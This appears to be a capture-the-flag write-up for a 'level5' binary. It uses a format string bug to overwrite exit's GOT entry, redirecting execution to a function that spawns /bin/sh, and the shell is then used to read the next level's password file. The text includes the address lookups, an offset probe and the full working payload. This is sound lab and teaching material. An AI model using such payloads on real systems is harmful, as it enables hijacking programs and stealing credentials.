The main of this program uses the function 'n,' which in turn uses the 'printf' function.
Additionally, we can observe the existence of an unused function 'o' that includes a call to 'system("/bin/sh").

The problem is that the functions n and o doesn't return anything it just exits the program.
So we need to find a way to overwrite the GOT entry of exit with the address of the function o.

let's find the address of the function o:
info function o
Non-debugging symbols:
0x080483c0 **gmon_start**
0x080483c0 **gmon_start**@plt
0x08048420 **do_global_dtors_aux
0x080484a4 o
0x080485a0 **do_global_ctors_aux

So the address of the function o is 0x080484a4 (134513828 in decimal)

Now let's find the address of the GOT entry of exit:

objdump -R level5 # Because the got address is not in the plt section
OFFSET   TYPE              VALUE 
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main

the address of the GOT entry of exit is 0x08049838

let's find the address position of exit:
like the previous exercises
python -c 'print "aaaa " + "%x " * 10' | ./level5 
aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078 

the address of exit is at the 4th position (61616161)

python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit
cat /tmp/exploit - | ./level5

this time:
/home/user/level6/.pass is necessary to get the password of level6
